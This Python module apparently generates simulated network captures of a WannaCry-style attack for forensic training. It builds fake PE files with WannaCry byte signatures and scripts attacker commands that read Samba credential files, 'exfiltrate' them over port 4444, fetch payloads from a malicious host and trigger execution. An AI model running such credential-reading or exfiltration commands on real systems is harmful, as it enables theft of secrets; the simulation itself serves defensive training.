"""
WannaCry Attack Simulation - Layer 3 Profile
=============================================

This module provides a Layer 3 profile for simulating a realistic multi-stage
WannaCry-style ransomware attack. It orchestrates multiple Layer 2 primitives
to create a complete attack chain including credential theft, malware download,
and remote execution.

Architecture:
    Layer 3 (Profiles) - wannacry.py [THIS MODULE]
        ↓ orchestrates
    Layer 2 (Abstraction) - tcp_plain_text_communication.py, http.py
        ↓ uses
    Layer 1 (Atomic) - tcp_primitives.py (Layer1Generator)

Attack Phases:
    1. Reconnaissance & Exfiltration: Plain-text TCP commands to steal credentials
    2. Malware Download: Fake HTTP wget of WannaCry components (base64 encoded)
    3. Remote Execution: Plain-text commands to execute stolen payload

DISCLAIMER:
    This simulation generates FAKE malware (random base64 data) for forensic
    training purposes ONLY. No real malicious code is created or executed.

Dependencies:
    - tcp_plain_text_communication: Layer 2 plain-text TCP primitive
    - Layer1Generator: TCP/HTTP Layer 1 primitives
    - scapy: Packet manipulation and PCAP export
    - typing: Type hints
"""

from ansible.module_utils.second_layer.tcp_plain_text_communication import tcp_plain_text_communication
from ansible.module_utils.second_layer.http import http_web_navigation
from ansible.module_utils.first_layer.tcp_primitives import Layer1Generator
from ansible.module_utils.utils import get_random_time, get_public_ip, now_ts
from typing import List, Optional
import base64
import os
import random
import struct
import subprocess
import sys

try:
    from scapy.all import Packet
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'scapy'])
    from scapy.all import Packet


def generate_fake_executable(
    size_bytes: int = 2048,
    seed: Optional[int] = None,
    index: int = 0,
    patterns_to_include: Optional[list] = None
) -> str:
    """
    Generate fake WannaCry-like PE executable content (base64 encoded).

    This mirrors the filesystem Layer 1 `create_pe_wannacry_file` primitive to
    ensure network-delivered binaries match the on-disk artifacts. It assembles
    a minimal PE with WannaCry signature patterns entirely in-memory and
    returns the base64 payload for HTTP delivery.

    Args:
        size_bytes: Target minimum size (bytes); payload is padded if smaller.
        seed: Base seed for reproducibility.
        index: Index offset for unique sub-seeds.
        patterns_to_include: Optional subset of pattern keys to embed.

    Returns:
        str: Base64-encoded PE file bytes.
    """
    if seed is not None:
        random.seed(seed + index)

    if patterns_to_include is None:
        patterns_to_include = ['main_1', 'main_2', 'main_3']

    WANNACRY_PATTERNS = {
        'main_1': bytes([
            0xA0, 0x00, 0x40, 0x00, 0x00, 0x56, 0x57, 0x6A, 0x00, 0x88, 0x85, 0x00, 0xFC, 0xFF, 0xFF, 0x59,
            0x33, 0xC0, 0x8D, 0xBD, 0x00, 0xFC, 0xFF, 0xFF, 0xF3, 0xAB, 0x66, 0xAB, 0xAA, 0x8D, 0x85, 0x00,
            0xFC, 0xFF, 0xFF, 0x68, 0x00, 0x50, 0x40, 0x00, 0x50, 0x53, 0xFF, 0x15, 0x00, 0x30, 0x40, 0x00
        ]),
        'main_2': bytes([
            0x68, 0x00, 0x50, 0x40, 0x00, 0x33, 0xDB, 0x50, 0x53, 0xFF, 0x15, 0x00, 0x30, 0x40, 0x00, 0x68,
            0x00, 0x60, 0x40, 0x00, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x59, 0xFF, 0x15, 0x00, 0x31, 0x40, 0x00,
            0x83, 0x38, 0x00, 0x75, 0x10, 0x68, 0x00, 0x61, 0x40, 0x00, 0xFF, 0x15, 0x00, 0x32, 0x40, 0x00
        ]),
        'main_3': bytes([
            0x83, 0xEC, 0x20, 0x56, 0x57, 0xB9, 0x40, 0x00, 0x00, 0x00, 0xBE, 0x00, 0x50, 0x40, 0x00, 0x8D,
            0x7C, 0x24, 0x08, 0x33, 0xC0, 0xF3, 0xA5, 0xA4, 0x89, 0x44, 0x24, 0x08, 0x89, 0x44, 0x24, 0x0C,
            0x89, 0x44, 0x24, 0x10, 0x89, 0x44, 0x24, 0x14, 0x89, 0x44, 0x24, 0x18, 0x66, 0x89, 0x44, 0x24
        ]),
        'start_service_3': bytes([
            0x83, 0xEC, 0x10, 0x68, 0x00, 0x70, 0x40, 0x00, 0x68, 0x00, 0x71, 0x40, 0x00, 0x6A, 0x00, 0xFF,
            0x15, 0x00, 0x40, 0x40, 0x00, 0xFF, 0x15, 0x00, 0x41, 0x40, 0x00, 0x83, 0x38, 0x00, 0x7D, 0x10,
            0xE8, 0x00, 0x20, 0x00, 0x00, 0x83, 0xC4, 0x10, 0xC3, 0x57, 0x68, 0x00, 0x72, 0x40, 0x00, 0x6A
        ]),
        'main_4': bytes([
            0x83, 0xEC, 0x10, 0x57, 0x68, 0x00, 0x80, 0x40, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x15, 0x00,
            0x50, 0x40, 0x00, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x30, 0x53, 0x56, 0x68, 0x00, 0x81, 0x40, 0x00,
            0x68, 0x00, 0x82, 0x40, 0x00, 0x57, 0xFF, 0x15, 0x00, 0x51, 0x40, 0x00, 0x8B, 0x1D, 0x00, 0x52
        ]),
        'main_5': bytes([
            0x68, 0x00, 0x90, 0x40, 0x00, 0x50, 0x53, 0xFF, 0x15, 0x00, 0x60, 0x40, 0x00, 0x8B, 0x35, 0x00,
            0x61, 0x40, 0x00, 0x8D, 0x85, 0x00, 0xFC, 0xFF, 0xFF, 0x6A, 0x00, 0x50, 0xFF, 0xD6, 0x59, 0x85,
            0xC0, 0x59, 0x74, 0x20, 0x8D, 0x85, 0x00, 0xFD, 0xFF, 0xFF, 0x6A, 0x00, 0x50, 0xFF, 0xD6, 0x59
        ]),
        'main_6': bytes([
            0xFF, 0x74, 0x24, 0x04, 0xFF, 0x74, 0x24, 0x08, 0xFF, 0x74, 0x24, 0x0C, 0xFF, 0x74, 0x24, 0x10,
            0xE8, 0x00, 0x20, 0x00, 0x00, 0xC2, 0x10, 0x00
        ])
    }

    def create_dos_header() -> bytes:
        dos_header = bytearray(64)
        dos_header[0:2] = b'MZ'
        dos_header[60:64] = struct.pack('<I', 128)
        return bytes(dos_header)

    def create_pe_signature() -> bytes:
        return b'PE\x00\x00'

    def create_coff_header() -> bytes:
        return struct.pack(
            '<HHIIIHH',
            0x014C,
            2,
            0,
            0,
            0,
            224,
            0x0102
        )

    def create_optional_header() -> bytes:
        optional = bytearray(224)
        optional[0:2] = struct.pack('<H', 0x010B)
        optional[16:20] = struct.pack('<I', 0x1000)
        optional[20:24] = struct.pack('<I', 0x1000)
        optional[24:28] = struct.pack('<I', 0x400000)
        optional[32:36] = struct.pack('<I', 0x1000)
        optional[36:40] = struct.pack('<I', 0x200)
        optional[56:60] = struct.pack('<I', 0x3000)
        optional[60:64] = struct.pack('<I', 0x400)
        optional[92:94] = struct.pack('<H', 3)
        return bytes(optional)

    def create_section_header(name: bytes, virtual_size: int, virtual_address: int, raw_size: int, raw_offset: int, characteristics: int) -> bytes:
        header = bytearray(40)
        header[0:8] = name.ljust(8, b'\x00')[:8]
        header[8:12] = struct.pack('<I', virtual_size)
        header[12:16] = struct.pack('<I', virtual_address)
        header[16:20] = struct.pack('<I', raw_size)
        header[20:24] = struct.pack('<I', raw_offset)
        header[36:40] = struct.pack('<I', characteristics)
        return bytes(header)

    dos_header = create_dos_header()
    dos_stub = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21' * 4
    pe_signature = create_pe_signature()
    coff_header = create_coff_header()
    optional_header = create_optional_header()

    text_section = create_section_header(b'.text', 0x1000, 0x1000, 0x1000, 0x400, 0x60000020)
    data_section = create_section_header(b'.data', 0x1000, 0x2000, 0x1000, 0x1400, 0xC0000040)

    headers = dos_header + dos_stub + b'\x00' * 8
    headers += pe_signature + coff_header + optional_header
    headers += text_section + data_section
    headers = headers.ljust(0x400, b'\x00')

    text_data = bytearray(0x1000)
    offset = 0
    for pattern_name in patterns_to_include:
        if pattern_name in WANNACRY_PATTERNS:
            pattern = WANNACRY_PATTERNS[pattern_name]
            insert_offset = random.randint(offset, min(offset + 200, 0x1000 - len(pattern)))
            text_data[insert_offset:insert_offset + len(pattern)] = pattern
            offset = insert_offset + len(pattern) + random.randint(50, 100)

    for i in range(0, 0x1000, 4):
        if text_data[i:i+4] == b'\x00\x00\x00\x00':
            text_data[i:i+4] = bytes([
                random.choice([0x55, 0x8B, 0x89, 0x83, 0xFF, 0x33, 0x50, 0x51]),
                random.randint(0, 255),
                random.randint(0, 255),
                random.choice([0xC3, 0x00, 0x90, 0xEB])
            ])

    data_section_content = bytearray(0x1000)
    strings = [
        b"WANNACRY\x00",
        b"mssecsvc.exe\x00",
        b"tasksche.exe\x00",
        b"C:\\Windows\\System32\\\x00",
        b"icacls . /grant Everyone:F /T /C /Q\x00"
    ]
    data_offset = 0
    for string in strings:
        if data_offset + len(string) < 0x1000:
            data_section_content[data_offset:data_offset+len(string)] = string
            data_offset += len(string) + random.randint(10, 50)

    pe_file = headers + bytes(text_data) + bytes(data_section_content)

    if size_bytes and len(pe_file) < size_bytes:
        pad_size = size_bytes - len(pe_file)
        pe_file += os.urandom(pad_size)

    return base64.b64encode(pe_file).decode('ascii')


def wannacry_attack_simulation(
    victim_ip: str,
    attacker_ip: Optional[str] = None,
    malicious_server_ip: Optional[str] = None,
    base_timestamp: Optional[float] = None,
    victim_mac: Optional[str] = None,
    attacker_mac: Optional[str] = None,
    malicious_server_mac: Optional[str] = None,
    seed: Optional[int] = None,
    index: int = 0
) -> List[Packet]:
    """
    Generate a complete WannaCry-style attack simulation.
    
    This Layer 3 profile orchestrates a multi-phase cyberattack:
    
    Phase 1 - Reconnaissance & Credential Exfiltration:
        - Attacker sends plain-text commands to victim (TCP port 4444)
        - Commands: list directories, read Samba credentials file
        - Victim responds with system information and credentials
        - Attacker performs fake exfiltration (sends creds back to attacker IP)
    
    Phase 2 - Malware Download (Fake wget):
        - Victim downloads 5 fake WannaCry components via HTTP
        - Each component is a fake executable (base64-encoded random data)
        - Files: wcry1.bin, wcry2.bin, wcry3.bin, wcry4.bin, wcry5.bin
        - Server is a malicious host controlled by attacker
    
    Phase 3 - Remote Execution:
        - Attacker sends execution command via plain-text TCP
        - Victim responds with fake execution confirmation
        - Simulates running the downloaded payload
    
    Args:
        victim_ip: Target victim's IP address (e.g., "192.168.1.100")
        attacker_ip: Attacker's IP address (generates random public IP if None)
        malicious_server_ip: Malware hosting server IP (generates if None)
        base_timestamp: Base timestamp for first packet (current time if None)
        victim_mac: Victim's MAC address (random if None)
        attacker_mac: Attacker's MAC address (random if None)
        malicious_server_mac: Malicious server's MAC address (random if None)
        seed: Base seed for reproducibility (None for random behavior)
        index: Index offset to derive unique sub-seeds
    
    Returns:
        List[Packet]: All packets representing the complete attack chain
    
    Packet Count:
        Phase 1: ~11 packets (3 handshake + 4 messages + 4 close)
        Phase 2: ~40 packets (5 files × 8 packets per HTTP exchange)
        Phase 3: ~7 packets (continuing from Phase 1 TCP stream)
        Total: ~58 packets
    
    Forensic Indicators:
        - Plain-text credential theft commands
        - Multiple binary downloads from suspicious server
        - Base64-encoded executables in HTTP responses
        - Remote execution commands
        - Use of non-standard ports (e.g., 4444)
        - Sequential attack pattern
        - Samba credential file access
        - Command & control behavior
    
    Example:
        >>> packets = wannacry_attack_simulation(
        ...     victim_ip="192.168.1.100",
        ...     attacker_ip="203.0.113.50",
        ...     seed=42
        ... )
        >>> wrpcap("wannacry_attack.pcap", packets)
    """
    # Initialize
    timestamp = base_timestamp if base_timestamp is not None else now_ts()
    all_packets: List[Packet] = []
    
    # Generate random IPs if not provided
    if attacker_ip is None:
        attacker_ip = get_public_ip(seed=seed, index=index)
    
    if malicious_server_ip is None:
        malicious_server_ip = get_public_ip(seed=seed, index=index + 1)
    
    # ========================================================================
    # PHASE 1: Reconnaissance & Credential Exfiltration
    # ========================================================================
    
    exfiltration_messages = [
        {
            "attacker": "uname -a",
            "victim": "Linux srv-finanzas 5.11.0-46-generic #51~20.04 SMP x86_64 GNU/Linux"
        },
        {
            "attacker": "id",
            "victim": "uid=0(root) gid=0(root) groups=0(root)"
        },
        {
            "attacker": "ls /etc/samba/",
            "victim": "creds.txt\nsmb.conf\nsecrets.tdb\nprivate_key.pem"
        },
        {
            "attacker": "cat /etc/samba/smb.conf | head -n 5",
            "victim": "[global]\nworkgroup = EMPRESA\nserver string = Finanzas File Server\nsecurity = user\nmap to guest = bad user"
        },
        {
            "attacker": "cat /etc/samba/creds.txt",
            "victim": "username=juan\npassword=Jd8!f9sQ\nserver=192.168.50.10\nshare=finanzas\npermissions=rw"
        },
        {
            "attacker": "grep -i pass /etc/samba/creds.txt",
            "victim": "password=Jd8!f9sQ"
        },
        {
            "attacker": "cat /home/juan/notes/todo.txt",
            "victim": "- update samba password\n- backup quarterly reports\n- credentials stored in /etc/samba/creds.txt (temporary!)"
        },
        {
            "attacker": "exfiltrate /etc/samba/creds.txt",
            "victim": "credentials transferred (538 bytes)"
        },
        {
            "attacker": "cat /var/log/auth.log | tail -n 3",
            "victim": "Dec  9 10:22 srv-finanzas sshd[5341]: Accepted password for juan\nDec  9 10:22 srv-finanzas sshd[5341]: session opened\nDec  9 10:23 srv-finanzas sudo: juan : TTY=pts/0 ; PWD=/home/juan ; USER=root ; COMMAND=/bin/nano"
        },
        {
            "attacker": "whoami",
            "victim": "root"
        }
    ]

    
    # Generate Phase 1 packets (TCP plain-text communication)
    # NOTE: We set close_connection=False to keep the TCP stream open for Phase 3
    phase1_packets = tcp_plain_text_communication(
        messages=exfiltration_messages,
        attacker_ip=attacker_ip,
        victim_ip=victim_ip,
        base_timestamp=timestamp,
        victim_port=4444,
        attacker_mac=attacker_mac,
        victim_mac=victim_mac,
        seed=seed,
        index=index + 1000,
        close_connection=False  # Keep connection open for Phase 3
    )
    
    # Add Phase 1 packets (but remove last 4 packets if they exist for connection close)
    # Since we set close_connection=False, this shouldn't be needed, but let's be safe
    all_packets.extend(phase1_packets)
    
    # Update timestamp for next phase
    current_time = get_random_time(
        phase1_packets[-1].time,
        distribution="uniform",
        seed=seed,
        index=index + 2000
    )
    
    # ========================================================================
    # PHASE 2: Malware Download (Fake wget via HTTP using Layer 2 http_web_navigation)
    # ========================================================================
    
    wannacry_components = [
        "main_1",
        "main_2", 
        "main_3",
        "main_4",
        "main_5"
    ]
    
    http_contents = []
    for i, filename in enumerate(wannacry_components):
        fake_exe_content = generate_fake_executable(
            size_bytes=2048 + i * 512,  # Vary size for each component
            seed=seed,
            index=index + 5000 + i,
            patterns_to_include=[filename]
        )
        # Format: (content_type, size_hint, custom_payload)
        # For binary downloads, we pass the base64-encoded fake executable as custom payload
        http_contents.append(("binary", len(fake_exe_content), fake_exe_content))
    
    http_packets, http_success, resolved_malware_ip = http_web_navigation(
        host='wanna.srvr',
        source_ip=victim_ip,
        dns_srvr_ip='8.8.8.8',
        srvr_ip=malicious_server_ip,
        contents=http_contents,
        base_timestamp=current_time,
        dest_port=80,
        client_mac=victim_mac,
        server_mac=malicious_server_mac,
        seed=seed,
        index=index + 3000
    )
    all_packets.extend(http_packets)
    
    current_time = get_random_time(
        http_packets[-1].time,
        distribution="uniform",
        seed=seed,
        index=index + 3500
    )
    
    # ========================================================================
    # PHASE 3: Remote Execution (continuing Phase 1 TCP stream)
    # ========================================================================
    
    # Initialize Layer 1 generator for Phase 3 TCP operations
    generator = Layer1Generator(seed=seed, index=index + 6000)
    
    # Continue the original TCP stream from Phase 1 by adding more packets
    # Get the last packets from Phase 1 to continue the conversation
    last_victim_packet = phase1_packets[-1]  # Last packet from Phase 1
    
    # Execution command from attacker
    execution_command = generator.add_packet_in_progress(
        previous_packet=last_victim_packet,
        payload="execute.exec.wcry",
        flags="PA",
        ts=current_time,
        client_mac=attacker_mac,
        server_mac=victim_mac
    )
    all_packets.append(execution_command)
    
    # Update timestamp
    current_time = get_random_time(
        execution_command.time,
        distribution="uniform",
        seed=seed,
        index=index + 6001
    )
    
    # Victim response - executing
    execution_response1 = generator.add_packet_in_progress(
        previous_packet=execution_command,
        payload=b"executing...",
        flags="PA",
        ts=current_time,
        client_mac=attacker_mac,
        server_mac=victim_mac
    )
    all_packets.append(execution_response1)
    
    # Update timestamp
    current_time = get_random_time(
        execution_response1.time,
        distribution="uniform",
        seed=seed,
        index=index + 6002
    )
    
    # Victim response - done
    execution_response2 = generator.add_packet_in_progress(
        previous_packet=execution_response1,
        payload=b"done.",
        flags="PA",
        ts=current_time,
        client_mac=attacker_mac,
        server_mac=victim_mac
    )
    all_packets.append(execution_response2)
    
    return all_packets
